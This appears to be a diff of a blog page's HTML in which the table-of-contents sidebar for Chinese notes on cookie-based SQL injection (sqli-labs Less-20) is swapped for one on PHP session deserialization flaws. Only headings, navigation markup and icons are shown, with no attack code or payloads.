-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-HTTP%E5%A4%B4-Cookie%E6%B3%A8%E5%85%A5-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-text">SQL HTTP头 Cookie注入 学习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%8E%9F%E7%90%86"><span class="toc-text">一、 核心概念与原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFCookie%EF%BC%9F"><span class="toc-text">1. 什么是Cookie？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%EF%BC%88%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%89"><span class="toc-text">2. 漏洞产生原理（源码分析）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E7%A4%BA%EF%BC%88%E4%BB%A5-sqli-labs-Less-20-%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-text">二、 靶场实战演示（以 sqli-labs Less-20 为例）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%AD%A3%E5%B8%B8%E7%99%BB%E5%BD%95%E5%B9%B6%E8%8E%B7%E5%8F%96Cookie"><span class="toc-text">第一步：正常登录并获取Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%8A%93%E5%8C%85%E5%B9%B6%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">第二步：抓包并测试注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-text">第三步：判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%8F%90%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-text">第四步：联合查询提取数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81-%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5-Payload-%E6%80%BB%E7%BB%93"><span class="toc-text">三、 常用注入 Payload 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81-%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%E4%BC%98%E5%85%88%E7%BA%A7%E9%A1%BA%E5%BA%8F"><span class="toc-text">四、 注入思路优先级顺序</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">PHP Session 反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81-%E6%A0%B8%E5%BF%83%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">一、 核心漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%89%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84-Session-%E5%AD%98%E5%82%A8%E6%A0%BC%E5%BC%8F"><span class="toc-text">1. 三种常见的 Session 存储格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%9C%BA%E6%99%AF"><span class="toc-text">2. 漏洞产生场景</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BE%8B%E9%A2%98"><span class="toc-text">二、例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">1. 靶场环境代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Bypass-%E6%8A%80%E5%B7%A7"><span class="toc-text">2. Bypass 技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Payload-%E6%9E%84%E9%80%A0"><span class="toc-text">3. Payload 构造</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
 </div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
